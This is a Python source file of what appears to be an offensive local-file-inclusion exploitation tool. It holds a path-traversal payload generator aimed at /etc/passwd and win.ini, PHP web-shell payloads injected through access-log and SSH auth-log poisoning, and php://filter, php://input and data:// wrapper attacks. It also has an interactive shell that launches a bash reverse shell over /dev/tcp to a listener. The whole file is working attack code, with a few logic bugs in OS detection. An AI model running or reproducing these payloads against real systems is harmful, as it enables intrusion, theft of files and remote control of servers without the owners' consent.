from utils import *
from shell import shell_session
from check_target import get_ip_info
from urllib.parse import urlunparse, urlparse, parse_qs, quote
import re
import sys
import threading
import base64
import socket
import paramiko

#---------------------------------------------------Path Traversal PoC Check---------------------------------------------------------------#
def generate_traversals(os_type, depth, extra_files):
    unix_files = ["/etc/passwd"]
    windows_files = [
        r"C:\Windows\win.ini"
    ]
    extra_files = extra_files if extra_files else []

    dots = [
        "..", ".%00.", "..%00", "..%01", ".?", "??", "?.", "%5C..", ".%2e",
        "%2e.", ".../.", "..../", "%252e%252e", "%c0%2e%c0%2e", "...."
    ]

    suffixes = ["%00", "?", " ", "%00index.html", ";index.html"]
    if os_type == "unix":
        slashes = ["/", "%2f", "0x2f", "%252f", "//"]
        prefixes = ["///", "../../../"]
        target_files = unix_files + extra_files
    elif os_type == "windows":
        slashes = ["\\", "%5c", "0x5c", "%255c", "//"]
        prefixes = ["\\\\\\", "\\.", "C:\\"]
        target_files = windows_files + extra_files
    else:
        slashes = ["/", "\\", "%2f", "%5c", "0x2f", "0x5c", "%252f", "%255c", "//"]
        prefixes = ["///", "\\\\\\", "\\.", "../../../", "C:\\"]
        target_files = unix_files + windows_files + extra_files

    traversal_patterns = [dot + slash for dot in dots for slash in slashes]
    traversal_strings = [pattern * i for pattern in traversal_patterns for i in range(1, depth + 1)]

    all_traversals = []

    for trav in traversal_strings:
        for filename in target_files:
            encoded_filename = encode_filename(filename, trav)
            if not encoded_filename.strip():
                continue

            core = trav + encoded_filename
            core = core.strip()
            all_traversals.append(core)
            for prefix in prefixes:
                prefix = prefix.strip()
                all_traversals.append(prefix + core)
            for suffix in suffixes:
                suffix = suffix.strip()
                all_traversals.append(core + suffix)
            for prefix in prefixes:
                for suffix in suffixes:
                    all_traversals.append(prefix + core + suffix)

    unique_payloads = sorted(set(all_traversals))
    with open("payloads.txt", "w") as f:
        for payload in unique_payloads:
            f.write(payload + "\n")
    return unique_payloads


def encode_filename(filename, traversal):
    if any(s in traversal for s in ["\\", "%5c", "0x5c", "%255c"]):
        return filename.replace("/", "\\")
    return filename.replace("\\", "/")


def test_traversal(url, traversal, success_count, failure_count, tried_count, retry_payloads, successful_payloads, stop_on_success,
                   found_success, keyword, cookie, target_os):

    parsed_url = urlparse(url)
    parsed_query = parse_qs(parsed_url.query)

    for parameter in parsed_query:
        if parsed_query[parameter][0] == "TARGET":
            parsed_query[parameter] = [traversal]


    new_query = "&".join(f"{key}={value[0]}" for key, value in parsed_query.items())
    new_url = urlunparse((
    parsed_url.scheme, parsed_url.netloc, parsed_url.path,
    parsed_url.params, new_query, parsed_url.fragment
    ))
    try:
        headers = {
            "User-Agent": get_random_user_agent()
        }
        response = get_query(new_url, cookie, headers)


        print(colored(f"Testing payload: {traversal}", "yellow", attrs=["bold"]))

        is_success = False
        if response:
            if keyword:
                if keyword.lower() in response.text.lower():
                    is_success = True
            else:
                if target_os.lower() == "unix":
                    if "root:x" in response.text:
                        is_success = True
                if target_os.lower() == "windows":
                    if "[fonts]" in response.text:
                        is_success = True

        if is_success:
            print(colored(f"[+] Target is vulnerable to {traversal}\n", "green", attrs=["bold"]))
            success_count[0] += 1
            successful_payloads.append(traversal)
            if stop_on_success:
                found_success.set()
        else:
            print(colored(f"[-] Payload is not vulnerable {traversal}\n", "red", attrs=["bold"]))
            failure_count[0] += 1

        tried_count[0] += 1

    except Exception as e:
        print(colored(f"[!] Error while testing {traversal}\n", "magenta"))
        print(e)

        retry_payloads.append(traversal)


def path_traversal_check(args):
    success_count = [0]
    failure_count = [0]
    tried_count = [0]
    retry_payloads = []
    successful_payloads = []
    found_success = threading.Event()

    stop_on_success = args.stop_on_success or False
    keyword = args.keyword
    delay_ms = 300 if args.delay_ms is None else args.delay_ms
    max_retries = args.max_retries
    target_os = args.target_os or "unknown"
    depth = args.depth or 2
    extra_files = args.extra_files or None
    traversals = generate_traversals(os_type=target_os, depth=depth, extra_files=extra_files)
    cookie = args.cookie or ""
    def run_tests(traversals_list):
        threads = []
        for traversal in traversals_list:
            if stop_on_success and found_success.is_set():
                break

            thread = threading.Thread(
                target=test_traversal,
                args=(args.url, traversal, success_count, failure_count, tried_count, retry_payloads, successful_payloads, stop_on_success,
                      found_success, keyword, cookie, target_os)
            )
            threads.append(thread)
            thread.start()

            if delay_ms < 0:
                time.sleep(0.3)

            elif delay_ms > 0:
                time.sleep(delay_ms / 1000.0)

        for thread in threads:
            thread.join()

    print(colored("[*] Starting initial payload test...", "blue"))
    run_tests(traversals)

    retries = 0
    while retry_payloads and retries < max_retries and not (stop_on_success and found_success.is_set()):
        print(colored(f"\n[!] Retrying failed payloads (Round {retries + 1})...", "cyan"))
        current_retry = retry_payloads.copy()
        retry_payloads.clear()
        time.sleep(3)
        run_tests(current_retry)
        retries += 1

    print(colored(f"\n[*] Total payloads tested: {tried_count[0]}", "cyan", attrs=["bold"]))
    print(colored(f"[+] Successful: {success_count[0]}", "green", attrs=["bold"]))
    print(colored(f"[x] Failed: {failure_count[0]}", "red", attrs=["bold"]))
    if retry_payloads:
        print(colored(f"[!] Payloads failed due to connection errors: {len(retry_payloads)}", "magenta", attrs=["bold"]))

    print(colored("[*]Successful payloads:\n", "yellow"))
    for payload in successful_payloads:
        print(colored(payload, "yellow", attrs=["bold"]))

#-------------------------------------------------------Access Log--------------------------------------------------------------------------#

def attempt_access_log_poisoning(url, cookie, method, is_windows=False):
    if method == "shell_exec":
        malicious_ua = "<?php echo 'first_delimiter'; echo shell_exec($_GET['cmd']); echo 'last_delimiter'; ?>"
    elif method == "system":
        malicious_ua = "<?php echo 'first_delimiter'; system($_GET['cmd']); echo 'last_delimiter'; ?>"
    else:
        malicious_ua = "<?php echo 'first_delimiter'; echo exec($_GET['cmd']); echo 'last_delimiter'; ?>"

    headers = {
        'User-Agent': malicious_ua
    }

    test_cmd = "set" if is_windows else "uptime"

    if method in ["shell_exec", "system", "exec"]:
        separator = "&" if "?" in url else "?"
        test_url = url + separator + "cmd=" + quote(test_cmd)
    else:
        test_url = url

    get_query(test_url, cookie, headers)

    headers = {
        "User-Agent":get_random_user_agent()
    }
    response = get_query(test_url, cookie, headers)

    if response is not None and response.status_code != 404:
        output = cmd_output(response.text)
        if output is not None:
            keyword = "c:\\windows\\system32" if is_windows else "load average"
            if keyword in output.lower():
                return True
    return False


def access_log_poisoning(args):
    global response
    response = None

    url = args.url
    cookie = args.cookie or ""

    if url_validation_check(url) == False:
        print(colored("[-] Please enter a valid URL format.", "red", attrs=["bold"]))
        return

    methods = ["system", "shell_exec", "exec"]
    success = {}

    print(colored("[*] Detecting target OS via access log poisoning...\n", "yellow", attrs=["bold"]))
    is_windows = False
    if attempt_access_log_poisoning(url, cookie, "system", is_windows=True):
        is_windows = True
        print(colored("[+] Target is Windows.", "green", attrs=["bold"]))
        if is_windows == False:
            if attempt_access_log_poisoning(url, cookie, "system", is_windows=False):
                print(colored("[+] Target is Linux.", "cyan", attrs=["bold"]))
            else:
                print(colored("[+] Couldn't detect OS.", "cyan", attrs=["bold"]))
                return

        print(colored("[+] Couldn't detect OS.", "cyan", attrs=["bold"]))

    for method in methods:
        print(colored(f"\n[*] Attempting access log poisoning using {method}...", "yellow", attrs=["bold"]))
        success[method] = attempt_access_log_poisoning(url, cookie, method, is_windows)

        if success[method]:
            print(colored(f"\n[+] Access log poisoning successful with {method}.\n", "green", attrs=["bold"]))
            break
        else:
            print(colored(f"\n[-] Access log poisoning attempt failed using {method}.\n", "red", attrs=["bold"]))

    if not any(success.values()):
        print(colored("\n[-] No valid method to execute commands.\n", "red", attrs=["bold"]))
        print(colored("[*] Quitting...\n", "yellow", attrs=["bold"]))
        return

    interactive_shell_accesslog(url, cookie, is_windows, args)



# -----------------------------------------------------Auth.log Poisoning--------------------------------------------------------------------#
def encode_payload(payload):
    return base64.b64encode(payload.encode()).decode()


def get_ssh_port(args):
    port = args.sshport or 22
    try:
        port = int(port)
        if not 1 <= port <= 65535:
            raise ValueError("Port must be between 1 and 65535")
    except ValueError as e:
        print(colored(f"[-] Invalid SSH port: {e}", "red", attrs=["bold"]))
        sys.exit(1)
    print(colored(f"[*] Using SSH Port: {port}\n", "yellow", attrs=["bold"]))
    return port


def fake_ssh_conn(target_ip, port, payload, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=target_ip, port=port, username=payload, password=password)
    except (socket.error, OSError):
        print(colored(f"[-] SSH connection failed: No service on {target_ip}:{port}\n", "red", attrs=["bold"]))
    except Exception:
        pass


def attempt_auth_poisoning(url, cookie, target_ip, port, password, method, is_windows):
    if method == "shell_exec_get":
        payload = "<?php echo 'first_delimiter'; echo shell_exec($_GET['cmd']); echo 'last_delimiter'; ?>"
    elif method == "system_get":
        payload = "<?php echo 'first_delimiter'; system($_GET['cmd']); echo 'last_delimiter'; ?>"
    elif method == "passthru_get":
        payload = "<?php echo 'first_delimiter'; passthru($_GET['cmd']); echo 'last_delimiter'; ?>"
    else:
        payload = "<?php echo 'first_delimiter'; system($_GET['cmd']); echo 'last_delimiter'; ?>"

    fake_ssh_conn(target_ip, port, payload, password)

    if "?" in url:
        separator = "&"
    else:
        separator = "?"
    if not is_windows:
        url = url + separator + "cmd=uptime"
    else:
        url = url + separator + "cmd=set"

    headers = {
        "User-Agent": get_random_user_agent()
    }

    response = get_query(url, cookie, headers)

    if response is not None and response.status_code != 404:
        output = cmd_output(response.text)
        if output is not None:
            if "load average" in output.lower():
                print(colored("[*] Target is Linux.","light_yellow"))
                return (True, True)
            elif "c:\\windows\\system32" in output.lower():
                print(colored("[*] Target is Windows.","light_yellow"))
                return (True, True)
            else:
                return (False, None)


def auth_log_poisoning(args):
    global response
    response = None
    tis_windows, fis_windows = False, False
    url = args.url
    cookie = args.cookie or ""

    if url_validation_check(url) == False:
        print(colored("[-] Please enter a valid URL format.", "red", attrs=["bold"]))
        return

    target_ip = str(get_ip_info(url)).strip()
    port = get_ssh_port(args)
    password = "doesntmatter"

    methods = ["system_get", "shell_exec_get", "passthru_get"]
    success = {}

    for method in methods:
        print(colored(f"\n[*] Attempting auth log poisoning using {method}...", "yellow", attrs=["bold"]))
        success[method], tis_windows = attempt_auth_poisoning(url, cookie, target_ip, port, password, method, is_windows=True)
        success[method], fis_windows = attempt_auth_poisoning(url, cookie, target_ip, port, password, method, is_windows=False)

        if success[method]:
            print(colored(f"\n[+] Auth log poisoning successful with {method}.\n", "green", attrs=["bold"]))
            break
        else:
            print(colored(f"\n[-] Auth Log poisoning attempt failed using {method}.\n", "red", attrs=["bold"]))

    method_found = any(success.get(m, False) for m in methods)

    if not method_found:
        print(colored("\n[-] No valid method to execute commands.\n", "red", attrs=["bold"]))
        print(colored("[*] Quitting...\n", "yellow", attrs=["bold"]))
        return
    if tis_windows:
        interactive_shell_authlog(url, cookie, args, is_windows=True)
    if fis_windows:
        interactive_shell_authlog(url, cookie, args, is_windows=False)

# -------------------------------------------------------php://filter--------------------------------------------------------------------------#
def is_base64(data):
    try:
        decoded = base64.b64decode(data, validate=True)
        return len(decoded) > 0
    except Exception:
        return False


def extract_phpfilter_data(data):
    dec = []
    longest_string = ""
    possible_base64_strings = re.findall(r"[A-Za-z0-9+/=]+", data)

    for b64_str in possible_base64_strings:
        if len(b64_str) % 4 == 0 and is_base64(b64_str):
            dec.append(b64_str)

            if len(b64_str) > len(longest_string):
                longest_string = b64_str

    return longest_string


def php_filter(args):
    qurl = args.url
    file_path = args.file
    cookie = args.cookie or ""

    if not url_validation_check(qurl):
        print(colored("[-] Invalid URL format.", "red", attrs=["bold"]))
        return

    qurl = reformat_url(qurl)
    file_path_encoded = quote(file_path)
    filter_str = "php://filter/convert.base64-encode/resource="
    new_url = qurl + filter_str + file_path_encoded

    print(colored(f"[*] Fetching from: {new_url}", "yellow", attrs=["bold"]))

    headers = {
        "User-Agent": get_random_user_agent()
    }

    result = get_query(new_url, cookie, headers)
    if not result:
        print(colored("[!] No response received.", "red", attrs=["bold"]))
        return

    result_cleaned = result.text.replace("\n", "").replace("\r", "")
    encoded_content = extract_phpfilter_data(result_cleaned)

    if encoded_content:
        try:
            decoded_content = base64.b64decode(encoded_content).decode("utf-8", errors="ignore")
            print(colored(f"\n[+] Decoded content of ", "green"), end="")
            print(colored(f"{file_path}:\n", "green", attrs=["bold"]))
            print(colored(decoded_content, "cyan"))
        except:
            print(colored("[!] Decoding failed.", "red", attrs=["bold"]))
    else:
        print(colored(f"[!] No information leak detected at {new_url}", "red", attrs=["bold"]))


# ------------------------------------------------------php://input--------------------------------------------------------------------------#
def generate_payload(cmd_b64, method):
    return f"<?php echo 'first_delimiter'; echo {method}(base64_decode('{cmd_b64}')); echo 'last_delimiter'; ?>"


def check_post_accept(args):
    url = args.url
    cookie = args.cookie or ""

    if not url_validation_check(url):
        print(colored("[-] Please enter a valid URL format.", "red", attrs=["bold"]))
        return

    url = reformat_url(url).strip()
    print(colored(f"\n[*] Checking if {url} accepts POST requests...", "yellow", attrs=["bold"]))

    header = {"Content-Type": "application/x-www-form-urlencoded"}
    if not post_query(url, cookie, header, "test=1", ""):
        print(colored("\n[-] Target does not seem to allow POST requests. Exploit might fail.", "red", attrs=["bold"]))
        return

    print(colored("\n[+] Target supports POST requests! Attempting exploit...\n", "green", attrs=["bold"]))
    PHPinput_command_exec(url, cookie, args)


def PHPinput_command_exec(url, cookie, args):
    print(colored("\n[*] Attempting to execute shell commands using shell_exec() and system() functions.", "yellow", attrs=["bold"]))

    header = {"Content-Type": "application/x-www-form-urlencoded",
              "User-Agent": get_random_user_agent()}

    is_windows = False

    target_url = f"{url}php://input"

    for method in ["shell_exec", "system"]:

        lin_payload = f"<?php echo 'first_delimiter'; echo {method}('uptime'); echo 'last_delimiter'; ?>"
        win_payload = f"<?php echo 'first_delimiter'; echo {method}('set'); echo 'last_delimiter'; ?>"

        if attempt_command_exec(target_url, cookie, header, win_payload, method, "windows"):
            is_windows = True

        if attempt_command_exec(target_url, cookie, header, lin_payload, method, "linux"):
            is_windows = False

        interactive_shell_input(target_url, cookie, method, header, args, is_windows)


    print(colored("\n[-] Neither shell_exec() nor system() were successful.\n", "red", attrs=["bold"]))


def attempt_command_exec(url, cookie, header, payload, method, os):
    response = post_query(url, cookie, header, payload, "")
    if response and response.status_code != 404:
        output = cmd_output(response.text)
        if output:
            if os == "windows":
                if "[fonts]" in output.lower():
                    print(colored(f"\n[+] The command execution with {method} was successful.", "green", attrs=["bold"]))
                    print(colored(f"\n[*]Target is Windows.", "yellow", attrs=["bold"]))
            if os == "linux":
                if "load average" in output.lower():
                    print(colored(f"\n[+] The command execution with {method} was successful.", "green", attrs=["bold"]))
                    print(colored(f"\n[*]Target is Linux.", "yellow", attrs=["bold"]))

            return True
    return False


# -------------------------------------------------------php://data--------------------------------------------------------------------------#
def php_data_wrapper(args):
    url = args.url
    cookie = args.cookie or ""
    if url_validation_check(url) == False:
        print(colored("[-] Please enter a valid URL format.", "red", attrs=["bold"]))
        return
    url = reformat_url(url)
    url = url.strip()

    is_windows = False

    format_name, format_payload, os = find_data_payload(url, cookie)
    if format_name:
        print(colored(f"[*] Using successful format: {format_name}", "green"))
        if os == "linux":
            is_windows = False
        if os == "windows":
            is_windows = True
        execute_data_command(url, cookie, format_name, args, is_windows)
    else:
        print(colored("[-] No working data:// format found.", "red"))

def find_data_payload(url, cookie):
    lin_cmd = "<?php echo 'first_delimiter'; system('uptime'); echo 'last_delimiter'; ?>"
    win_cmd = "<?php echo 'first_delimiter'; system('set'); echo 'last_delimiter'; ?>"
    win_encmd = base64.b64encode(win_cmd.encode()).decode()
    win_encmd_url = quote(win_encmd)
    lin_encmd = base64.b64encode(lin_cmd.encode()).decode()
    lin_encmd_url = quote(lin_encmd)

    win_formats = {
        "data:,": f"data:,{win_cmd}",
        "data://,": f"data://,{win_cmd}",
        "data:text/plain;base64,": f"data:text/plain;base64,{win_encmd_url}",
        "data://text/plain;base64,": f"data://text/plain;base64,{win_encmd_url}"
    }

    lin_formats = {
        "data:,": f"data:,{lin_cmd}",
        "data://,": f"data://,{lin_cmd}",
        "data:text/plain;base64,": f"data:text/plain;base64,{lin_encmd_url}",
        "data://text/plain;base64,": f"data://text/plain;base64,{lin_encmd_url}"
    }

    for name, payload in win_formats.items():
        success, format_name, format_payload, os = send_wrapper_data_cmd(url, cookie, name, payload, "windows")
        if success:
            return format_name, format_payload, os

    for name, payload in lin_formats.items():
        success, format_name, format_payload, os = send_wrapper_data_cmd(url, cookie, name, payload, "linux")
        if success:
            return format_name, format_payload, os

    return None, None, None


def send_wrapper_data_cmd(url, cookie, format_name, format_payload, os):
    qurl = url + format_payload
    print(colored(f"[*] Trying {format_name} format for {os.capitalize()}...", "yellow"))

    headers = {
        "User-Agent": get_random_user_agent()
    }

    response = get_query(qurl, cookie, headers)
    if response:
        output = cmd_output(response.text)
        if output:
            if os == "linux":
                if "load average" in output.lower():
                        print(colored(f"[+] {format_name} format was successful.\n", "green"))
                        print(colored("[*] Target is Linux.", "yellow"))
                        return True, format_name, format_payload, "linux"
                else:
                    print(colored(f"[-] {format_name} format was not successful for {os.capitalize()}\n", "yellow"))
            if os == "windows":
                if "[fonts]" in output.lower():
                        print(colored(f"[+] {format_name} format was successful.\n", "green"))
                        print(colored("[*] Target is Windows.", "yellow"))
                        return True, format_name, format_payload, "windows"
                else:
                    print(colored(f"[-] {format_name} format was not successful for {os.capitalize()}\n","yellow"))
        else:
            print(colored(f"[-] {format_name} format was not successful.\n", "red"))
    return False, None, None, None



def execute_data_command(url, cookie, format_name, args, is_windows):
    print(colored(f"[*] Command execution started with format: {format_name}\n", "green"))

    test_cmd = "<?php echo 'first_delimiter'; system('id'); echo 'last_delimiter'; ?>"
    encmd = base64.b64encode(test_cmd.encode()).decode()
    encmd_url = quote(encmd)

    if "base64" in format_name:
        if format_name == "data:text/plain;base64,":
            payload = f"data:text/plain;base64,{encmd_url}"
        else:
            payload = f"data://text/plain;base64,{encmd_url}"
    else:
        if format_name == "data:,":
            payload = f"data:,{test_cmd}"
        else:
            payload = f"data://,{test_cmd}"

    full_url = url + payload

    headers = {"User-Agent": get_random_user_agent()}
    response = get_query(full_url, cookie, headers)
    if response:

        unified_interactive_shell(full_url, cookie=cookie, is_windows=is_windows, args=args,method=format_name, is_post=False, user_agent=headers,
                           post_wrapper=False)
    return


def unified_interactive_shell(exec_url, cookie, is_windows, args, method="get", is_post=False, user_agent=None, post_wrapper=False):
    print(colored("\n[*] Press 0 to access shell environment.", "yellow", attrs=["bold"]))

    while True:
        cmd = input(colored("\n[>] Enter a command: ", "yellow", attrs=["bold"])).strip()

        if cmd.lower() in ("exit", "quit"):
            print(colored("\n[*] Quitting...\n", "yellow", attrs=["bold"]))
            return

        shell_flag = False
        if cmd == "0":
            shell_flag = True
            listener_ip = get_ip()
            listener_port = get_port() or 4545

            if is_windows:
                cmd = "cmd"
            else:
                cmd = f"/bin/bash -c \"bash -i > /dev/tcp/{listener_ip}/{listener_port} 0>&1\""

        cmd_b64 = encode_payload(cmd)

        if not shell_flag:
            if method.startswith("data"):
                url, _ = exec_url.split(',', 1)
                url += ','

                if "base64" not in method:
                    safe_cmd = cmd.replace("'", "\\'")
                    payload = f"<?php echo 'first_delimiter'; system('{safe_cmd}'); echo 'last_delimiter'; ?>"
                    full_exec_url = url + payload
                else:
                    safe_cmd = cmd.replace("'", "\\'")
                    payload = f"<?php echo 'first_delimiter'; system('{safe_cmd}'); echo 'last_delimiter'; ?>"
                    payload_b64 = base64.b64encode(payload.encode()).decode()
                    full_exec_url = url + payload_b64
            else:
                separator = "&" if "?" in exec_url else "?"
                full_exec_url = exec_url + separator + "cmd=" + quote(cmd)
        else:
            if not post_wrapper:
                separator = "&" if "?" in exec_url else "?"
                full_exec_url = exec_url + separator + "cmd=" + quote(cmd)
            else:
                full_exec_url = exec_url

        headers = user_agent or {"User-Agent": get_random_user_agent()}

        if shell_flag:
            if method.startswith("data"):
                url, _ = exec_url.split(',', 1)
                url = url + ","

                if "base64" not in method:
                    cmd = f"/bin/bash -c \"bash -i > /dev/tcp/{listener_ip}/{listener_port} 0>%261\""
                    cmd = cmd.replace("'", "\\'")
                    payload = f"<?php echo 'first_delimiter'; system('{cmd}'); echo 'last_delimiter'; ?>"
                    exec_url = url + payload

                else:
                    cmd = f"/bin/bash -c \"bash -i > /dev/tcp/{listener_ip}/{listener_port} 0>&1\""
                    cmd = cmd.replace("'", "\\'")
                    payload = f"<?php echo 'first_delimiter'; system('{cmd}'); echo 'last_delimiter'; ?>"
                    payload_b64 = base64.b64encode(payload.encode()).decode()
                    exec_url = url + payload_b64

                shell_session(exec_url, cookie, headers, cmd, listener_port, args)
                return

            else:
                payload = cmd if not post_wrapper else generate_payload(cmd_b64, method)
                print(full_exec_url)
                shell_session(full_exec_url, cookie, headers, payload, listener_port, args)
                return

        if is_post:
            payload = cmd if not post_wrapper else generate_payload(cmd_b64, method)
            response = post_query(full_exec_url, cookie, headers, payload, "")
        else:
            response = get_query(full_exec_url, cookie, headers)

        if response is not None:
            output = cmd_output(response.text)
            if output:
                print(colored(output.strip(), "cyan", attrs=["bold"]))

def interactive_shell_authlog(exec_url, cookie, args, is_windows):
    unified_interactive_shell(exec_url, cookie, is_windows, args, method="get")

def interactive_shell_input(url, cookie, method, user_agent, args, os):
    unified_interactive_shell(url, cookie, os, args, method=method, is_post=True, user_agent=user_agent, post_wrapper=True)

def interactive_shell_accesslog(exec_url, cookie, is_windows, args):
    unified_interactive_shell(exec_url, cookie, is_windows, args, method="get")











